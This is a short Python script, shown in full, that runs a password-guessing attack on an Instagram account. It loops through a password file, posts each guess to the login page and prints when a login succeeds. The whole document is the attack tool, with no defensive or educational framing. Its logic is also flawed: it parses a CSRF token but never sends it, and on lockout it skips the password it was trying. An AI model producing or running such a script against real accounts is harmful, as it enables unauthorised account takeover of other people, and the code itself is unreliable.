import requests

url = 'https://www.instagram.com/accounts/login/'

username = 'USERNAME'
password_file = 'PASSWORDS.txt'

with open(password_file) as f:
    passwords = f.read().splitlines()

for password in passwords:
    session = requests.Session()
    login_page = session.get(url).content
    csrf_token = str(login_page).split('csrf_token')[1].split('value="')[1].split('"')[0]

    login_data = {'username': username, 'password': password}
    headers = {'referer': url}

    login = session.post(url, data=login_data, headers=headers)

    if 'Please wait a few minutes before you try again' in login.text:
        print(f'Account is locked. Trying next password: {password}')
        continue
    elif 'Your password was incorrect' in login.text:
        print(f'Incorrect password: {password}')
    else:
        print(f'Successful login with password: {password}')
        break